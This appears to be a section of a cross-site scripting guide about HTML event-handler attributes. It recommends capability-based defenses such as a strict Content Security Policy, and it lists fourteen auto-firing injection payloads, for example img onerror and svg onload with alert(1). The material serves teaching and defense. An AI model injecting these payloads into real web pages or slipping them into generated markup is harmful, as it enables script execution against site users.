The Event-Handler Catalog

Every on* attribute is a JavaScript execution sink. This is why an allow/deny list of handler names is a losing game — the surface is huge and grows with every spec. Rows marked AUTO can fire with no user interaction, given the right element/attribute combo.

Defensive reading. Do not try to memorize these. Absorb the shape of the problem: the set is large, versioned, and partly auto-firing. A correct defense refuses all inline handlers by capability (CSP script-src without 'unsafe-inline', or attribute encoding that prevents any on* from forming) rather than enumerating names.

The auto-firing short list (memorize these)

You rarely need 150. These reliably fire with zero interaction and cover almost every real injection:

<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<style onload=alert(1)></style>
<object data=x onerror=alert(1)>
<iframe onload=alert(1)>
